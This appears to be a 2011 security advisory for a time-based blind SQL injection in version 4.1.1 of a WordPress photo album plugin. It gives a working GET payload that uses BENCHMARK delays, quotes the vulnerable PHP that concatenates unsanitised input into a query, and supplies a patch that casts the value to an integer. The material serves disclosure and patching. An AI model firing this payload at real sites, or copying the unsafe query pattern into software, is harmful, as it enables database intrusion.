# Date: 2011-10-14
# Author: Skraps (jackie.craig.sparks(at)live.com jackie.craig.sparks(at)gmail.com @skraps_foo)
# Version: 4.1.1 (tested)
 
---------------
PoC (GET data)
---------------
wppa-album=1 AND 1=IF(2>1,BENCHMARK(500000000,MD5(CHAR(115,113,108,109,97,112))),0)&wppa-cover=0&wppa-occur=1
 
e.g.
 
 
---------------
Vulnerable code
---------------
Line 76 of wppa-functions.php:
if ( $this_occur ) $alb = wppa_get_get(&#039;album&#039;);
        if ( ! $alb && is_numeric($wppa[&#039;start_album&#039;]) ) $alb = $wppa[&#039;start_album&#039;];
 
        $separate = wppa_is_separate($alb);
 
$slide = ( wppa_get_album_title_linktype($alb) == &#039;slide&#039; ) ? &#039;&wppa-slide&#039; : &#039;&#039;;
 
 
Line 3170 of wppa-functions.php:
function wppa_get_get($index, $default = false) {
#xdebug_start_trace(&#039;/var/www/xdebug.log&#039;);
        if (isset($_GET[&#039;wppa-&#039;.$index])) {             // New syntax first
                return $_GET[&#039;wppa-&#039;.$index];
        }
        if (isset($_GET[$index])) {                             // Old syntax
                return $_GET[$index];
        }
        return $default;
}
 
Line 3362 of wppa-functions.php:
function wppa_get_album_title_linktype($alb) {
global $wpdb;
        if ( $alb ) $result = $wpdb->get_var("SELECT cover_linktype FROM ".WPPA_ALBUMS." WHERE id = ".$alb." LIMIT 1");
        else $result = &#039;&#039;;
echo $result;
        return $result;
}
 
---------------
Patch
---------------
*** ./wppa-functions.php    2011-10-03 09:37:48.000000000 -0400
--- ./wppa-functions.php.new    2011-10-15 16:02:27.996945496 -0400
***************
*** 3361,3367 ****
   
  function wppa_get_album_title_linktype($alb) {
  global $wpdb;
!
    if ( $alb ) $result = $wpdb->get_var("SELECT cover_linktype FROM ".WPPA_ALBUMS." WHERE id = ".$alb." LIMIT 1");
    else $result = &#039;&#039;;
  //echo $result;
--- 3361,3367 ----
   
  function wppa_get_album_title_linktype($alb) {
  global $wpdb;
!   $alb=intval($alb);
    if ( $alb ) $result = $wpdb->get_var("SELECT cover_linktype FROM ".WPPA_ALBUMS." WHERE id = ".$alb." LIMIT 1");
    else $result = &#039;&#039;;
  //echo $result;
***************
*** 3384,3387 ****
  global $wppa;
   
    if ( $wppa[&#039;any&#039;] ) echo $wppa[&#039;searchresults&#039;];
! }
\ No newline at end of file
--- 3384,3387 ----
  global $wppa;
   
    if ( $wppa[&#039;any&#039;] ) echo $wppa[&#039;searchresults&#039;];
! }



